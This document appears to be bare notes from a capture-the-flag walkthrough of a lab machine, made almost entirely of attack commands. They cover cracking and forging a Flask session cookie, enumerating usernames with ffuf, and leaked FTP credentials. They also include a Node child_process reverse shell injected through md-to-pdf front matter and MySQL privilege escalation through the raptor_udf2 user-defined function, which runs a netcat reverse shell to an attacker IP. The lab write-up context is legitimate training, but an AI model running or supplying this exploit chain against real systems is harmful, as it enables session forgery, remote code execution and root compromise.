```
CKEDITOR 4.6.2
```

```
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```

```
flask-secret=secret123
```

```
ffuf -ic -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -u "http://10.10.11.160:5000/login" -X POST -d "username=FUZZ\&password=fo  
o"
```

```
flask-unsign --sign --cookie "{
    "logged_in": True,
    "username": "blue"
}" --secret 'secret123'
```

```
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yrw-fw.628eXSMka6w0BCzQ1Xjlr-SuBM8
```

```

    Hello, Thank you for choosing our premium service. Now you are capable of
doing many more things with our application. All the information you are going
to need are on the Email we sent you. By the way, now you can access our FTP
service as well. Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.  
(Additional information are included in the attachments we sent along the
Email)  
  
We all hope you enjoy our service. Thanks!  
  
ftp_admin

```

```

    * Delete the password note  
* Ask the admin team to change the password
```

```
usr blue
pass blue@Noter!
```

```
use fpt_admin
pass fpt_admin@Noter!
```

```
---js\n((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.17 8888 >/tmp/f"))\n---RCE
```

```
select 'abc' into outfile '/tmp/test/abc';
/home/svc/user.txt
```


```
cd /opt
```
Nildogg36


```
http://10.10.14.17:4444/raptor_udf2.so
```

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

```
show variables like '%plugin%';
select do_system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.17 1234 >/tmp/f');
```
# Referensi

```
https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/
https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880
```
